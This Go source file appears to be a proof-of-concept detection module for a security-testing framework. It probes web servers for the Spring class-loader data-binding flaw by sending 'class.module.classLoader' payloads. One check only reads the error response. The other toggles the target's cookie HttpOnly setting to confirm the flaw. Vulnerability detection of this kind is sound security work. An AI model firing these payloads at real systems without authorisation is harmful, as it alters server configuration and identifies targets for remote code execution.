package poc_spring

import (
	"github.com/lz520520/railgunlib/pkg/register/poc_register"
	"github.com/lz520520/railgunlib/pkg/templates/poc_model"
	"github.com/lz520520/railgunlib/pkg/templates/poc_templates"
	"strings"
)

type Poc_Spring_Bean_RCE struct {
	poc_templates.PocTemplate
}

func (self *Poc_Spring_Bean_RCE) Poc1() (pocResult poc_model.PocPerPayloadResult) {
	// 默认配置
	pocResult.Status = false
	headers := self.GetInitPocHeaders()
	// 构造payload
	payload := "class.module.classLoader.clearReferencesRmiTargets=aaaa"

	httpresp := self.HttpGetWithoutRedirect(self.Params.Target, headers)
	if httpresp.Err != nil {
		pocResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode == 400 {
		return
	}

	// GET请求
	httpresp = self.HttpGetWithoutRedirect(strings.TrimRight(self.Params.Target, "?")+"?"+payload, headers)
	if httpresp.Err != nil {
		pocResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode == 400 {
		pocResult.Status = true
		pocResult.Messages = "400 GET Method"
		return
	}

	// GET请求
	httpresp = self.HttpPostWithoutRedirect(strings.TrimRight(self.Params.Target, "?"), payload, headers)
	if httpresp.Err != nil {
		return
	}
	if httpresp.Resp.StatusCode == 400 {
		pocResult.Status = true
		pocResult.Messages = "400 POST Method"
	}
	return

}

func (self *Poc_Spring_Bean_RCE) Poc2() (pocResult poc_model.PocPerPayloadResult) {
	// 默认配置
	pocResult.Status = false
	headers := self.GetInitPocHeaders()
	// 构造payload
	falsePayload := "class.module.classLoader.resources.context.useHttpOnly=false"
	truePayload := "class.module.classLoader.resources.context.useHttpOnly=true"
	// GET请求
	httpresp := self.HttpGetWithoutRedirect(strings.TrimRight(self.Params.Target, "?")+"?"+falsePayload, headers)
	if httpresp.Err != nil {
		pocResult.Err = httpresp.Err
		return
	}
	if !strings.Contains(strings.ToLower(httpresp.Resp.Header.Get("Set-Cookie")), "httponly") {
		httpresp = self.HttpGetWithoutRedirect(strings.TrimRight(self.Params.Target, "?")+"?"+truePayload, headers)
		if httpresp.Err != nil {
			pocResult.Err = httpresp.Err
			return
		}
		if strings.Contains(strings.ToLower(httpresp.Resp.Header.Get("Set-Cookie")), "httponly") {
			pocResult.Status = true
			pocResult.Messages = "HttpOnly GET Method"
			return
		}
	}

	// GET请求
	httpresp = self.HttpPostWithoutRedirect(self.Params.Target, falsePayload, headers)
	if httpresp.Err != nil {
		pocResult.Err = httpresp.Err
		return
	}
	if !strings.Contains(strings.ToLower(httpresp.Resp.Header.Get("Set-Cookie")), "httponly") {
		httpresp = self.HttpPostWithoutRedirect(self.Params.Target, truePayload, headers)
		if httpresp.Err != nil {
			pocResult.Err = httpresp.Err
			return
		}
		if strings.Contains(strings.ToLower(httpresp.Resp.Header.Get("Set-Cookie")), "httponly") {
			pocResult.Status = true
			pocResult.Messages = "HttpOnly POST Method"
			return
		}
	}
	return

}

func init() {
	registerMsg := poc_register.PocRegisterMsg{Msg: poc_model.PocMsg{
		Author: "lz520520",
		Time:   "2022-03-31",
		Range:  "",
		ID:     "",
		Describe: `
Spring MVC
JDK>=9
`,
	},
		Proto: poc_model.PocHTTP,
	}
	poc_register.PocStructRegister(&Poc_Spring_Bean_RCE{}, registerMsg)
}
